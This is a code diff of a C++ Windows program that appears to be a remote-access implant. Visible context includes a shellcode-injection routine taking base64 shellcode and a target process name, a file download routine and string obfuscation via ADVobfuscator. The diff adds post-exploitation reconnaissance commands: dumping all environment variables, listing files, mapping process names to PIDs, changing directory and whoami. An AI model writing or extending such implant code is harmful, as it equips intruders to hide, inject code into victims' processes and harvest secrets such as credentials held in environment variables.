@@ -5,11 +5,14 @@
 #include "debug.h"
 #include "profile.h"
 #include <shlwapi.h>
+#include <map>
+#include <psapi.h>
 #include "crypto.h"
 #include "rapidjson/document.h"
 #include "rapidjson/writer.h"
 #include "rapidjson/stringbuffer.h"
 #include "obfuscator/MetaString.h"
+#include <Lmcons.h>
 using namespace andrivet::ADVobfuscator;
 
 
@@ -274,6 +277,12 @@ std::string Download(std::string filepath) {
     std::vector<BYTE> vec;
     vec.reserve(bytes_read);
     vec.assign(raw_buffer, raw_buffer + bytes_read);
+    
+    // Base64 encode the byte vector
+    //std::string encoded = base64Encode(vec);
+
+    free(raw_buffer);
+    CloseHandle(hFile);
     return std::string(vec.begin(), vec.end());
 }
 
@@ -312,4 +321,103 @@ std::string Inject(std::string b64shellcode, std::string processName) {
     }
     CloseHandle(process_info.hProcess);
     return "OK";
+}
+
+bool ChangeDir(std::string path) {
+    return SetCurrentDirectoryA(path.c_str());
+}
+
+std::string GetDir() {
+    char buffer[MAX_PATH];
+    GetCurrentDirectoryA(MAX_PATH, buffer);
+    return std::string(buffer);
+}
+
+std::map<std::string, std::string> GetAllEnvVars()
+{
+    std::map<std::string, std::string> envVars;
+    char* env = GetEnvironmentStrings();
+    if (env == nullptr) {
+        return envVars; // return empty map if GetEnvironmentStrings() fails
+    }
+
+    for (char* var = env; *var != '\0'; var++) {
+        std::string envVar(var);
+        std::string::size_type pos = envVar.find('=');
+        if (pos != std::string::npos) {
+            std::string name = envVar.substr(0, pos);
+            std::string value = envVar.substr(pos + 1);
+            envVars[name] = value;
+        }
+    }
+
+    FreeEnvironmentStrings(env);
+    return envVars;
+}
+
+std::vector<std::string> GetAllFilesInCurrentDirectory()
+{
+    std::vector<std::string> files;
+
+    WIN32_FIND_DATAA fileData;
+    HANDLE hFind = INVALID_HANDLE_VALUE;
+
+    char currentDir[MAX_PATH];
+    GetCurrentDirectoryA(MAX_PATH, currentDir);
+
+    std::string searchPath(currentDir);
+    searchPath.append("\\*.*");
+
+    hFind = FindFirstFileA(searchPath.c_str(), &fileData);
+
+    if (hFind != INVALID_HANDLE_VALUE)
+    {
+        do
+        {
+            std::string fName(fileData.cFileName);
+
+            if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+            {
+                // Add a slash to the end of the directory name
+                fName.append("\\");
+            }
+
+            files.push_back(fName);
+
+        } while (FindNextFileA(hFind, &fileData) != 0);
+
+        FindClose(hFind);
+    }
+
+    return files;
+}
+
+std::map<std::string, DWORD> GetProcessNameToPIDMap()
+{
+    std::map<std::string, DWORD> processMap;
+    DWORD processIDs[1024], bytesNeeded;
+
+    if (EnumProcesses(processIDs, sizeof(processIDs), &bytesNeeded)) {
+        const DWORD numProcesses = bytesNeeded / sizeof(DWORD);
+
+        for (DWORD i = 0; i < numProcesses; ++i) {
+            HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIDs[i]);
+            if (processHandle) {
+                CHAR processName[MAX_PATH];
+                if (GetModuleBaseNameA(processHandle, nullptr, processName, sizeof(processName))) {
+                    processMap[processName] = processIDs[i];
+                }
+                CloseHandle(processHandle);
+            }
+        }
+    }
+
+    return processMap;
+}
+
+std::string Whoami() {
+    char username[UNLEN + 1];
+    DWORD username_len = UNLEN + 1;
+    GetUserNameA(username, &username_len);
+    return std::string(username);
 }
